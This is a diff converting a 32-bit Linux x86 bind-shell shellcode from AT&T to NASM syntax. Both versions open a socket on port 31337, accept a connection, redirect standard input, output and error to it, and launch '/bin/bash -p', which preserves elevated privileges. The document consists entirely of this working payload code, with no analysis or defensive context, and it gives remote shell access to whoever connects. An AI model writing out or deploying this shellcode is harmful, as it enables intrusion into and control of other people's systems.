@@ -1,102 +1,91 @@
-.global _start
-_start:
-	push $0x66
-	pop %eax # sockcall()
-	cdq
+BITS 32
+; socket(AF_INET, SOCK_STREAM, 0);
+push BYTE 0x66
+pop eax ; sockcall()
+cdq
 
-	xor %ebx, %ebx
-	inc %ebx # SYS_SOCKET
+xor ebx, ebx
+inc ebx ; SYS_SOCKET
 
-	push %edx
-	push %ebx
-	push $0x02
+push edx
+push ebx
+push BYTE 0x02
 
-	mov %esp, %ecx # args = {2 , 1 , 0} AF_INET, SOCK_STREAM, 0
-	int $0x80 # socket(AF_INET, SOCK_STREAM, 0);
+mov ecx, esp ; args = {AF_INET, SOCK_STREAM, 0}
+int 0x80
 
-	mov %eax, %esi
-	push $0x66
-	pop %eax # sockcall()
+; bind(fd, {AF_INET, 31337, INADDR_ANY}, 16); 
+xchg esi, eax
+push BYTE 0x66
+pop eax ; sockcall()
 
-	inc %ebx # SYS_BIND
+inc ebx ; SYS_BIND
 
-	push %edx
-	pushw $0x697a
-	pushw %bx 
-	
-	mov %esp, %ecx # {AF_INET, 31337, INADDR_ANY}
+push edx
+push WORD 0x697a
+push WORD bx
 
-	push $0x10
-	push %ecx
-	push %esi 
-	mov %esp, %ecx # args = {fd, &sockaddr_in, 16}
+mov ecx, esp ; {AF_INET, 31337, INADDR_ANY}
 
-	int $0x80 # bind(fd, {AF_INET, 1337, INADDR_ANY}, 16)
+push BYTE 0x10
+push ecx
+push esi
+mov ecx, esp ; args = {fd, &sockaddr_in, 16}
 
-	push $0x66	
-	pop %eax # sockcall()
-	
-	inc %ebx
-	inc %ebx # SYS_LISTEN
-	
-	push %ebx	
-	push %esi
-	mov %esp, %ecx # args = {fd, 4}
+int 0x80
 
-	int $0x80 # listen(fd, 4)
+; listen(fd, 4)
+mov BYTE al, 0x66 ; sockcall()
 
-	push $0x66	
-	pop %eax # sockcall()
-	
-	inc %ebx # SYS_ACCEPT
+inc ebx
+inc ebx ; SYS_LISTEN
 
-	push %edx
-	push %edx
-	push %esi
-	mov %esp, %ecx # args = {fd, NULL, NULL}
+push ebx
+push esi
+mov ecx, esp ; args = {fd, 4}
 
-	int $0x80 # accept(fd, NULL, NULL)
+int 0x80
 
-	mov %eax, %ebx 
+; accept(fd, NULL, NULL)
+mov BYTE al, 0x66 ; sockcall()
 
-	push $0x3f
-	pop %eax # dup2
+inc ebx ; SYS_ACCEPT
 
-	mov %edx, %ecx
-	
-	int $0x80 # dup2(fd, 0)
+push edx
+push edx
+push esi
+mov ecx, esp ; args = {fd, NULL, NULL}
 
-	push $0x3f
-	pop %eax # dup2
+int 0x80
 
-	inc %ecx
-	
-	int $0x80 # dup2(fd, 1)
+; dup2(fd, 2-0)
+xchg eax, ebx ; ebx = fd
 
-	push $0x3f
-	pop %eax # dup2
+push BYTE 0x2
+pop ecx ; ecx = 2
 
-	inc %ecx
-	
-	int $0x80 # dup2(fd, 2)
+dup_loop:
+mov BYTE al, 0x3f ; dup2
+int 0x80
+dec ecx
+jns dup_loop
 
-	push $0x0b
-	pop %eax # execve
-	
-	push %edx
-	push $0x68
-	push $0x7361622f
-	push $0x6e69622f
+; execve("/bin/bash", {"/bin/bash", -p, NULL}, NULL)
+mov BYTE al, 0x0b ; execve
 
-	mov %esp, %ebx # /bin/bash
+push edx
+push BYTE 0x68
+push 0x7361622f
+push 0x6e69622f
+mov ebx, esp ; ebx = /bin/bash
 
-	push %edx
-	pushw $0x702d 
-	mov %esp, %ecx # -p
+push edx
+push WORD 0x702d
+mov ecx, esp ; ecx = -p
 
-	push %edx
-	push %ecx
-	push %ebx
-	mov %esp, %ecx # argv
+push edx
+push ecx
+push ebx
+mov ecx, esp ; ecx = argv
 
-	int $0x80 # execve("/bin/bash", argv, NULL)
+int 0x80
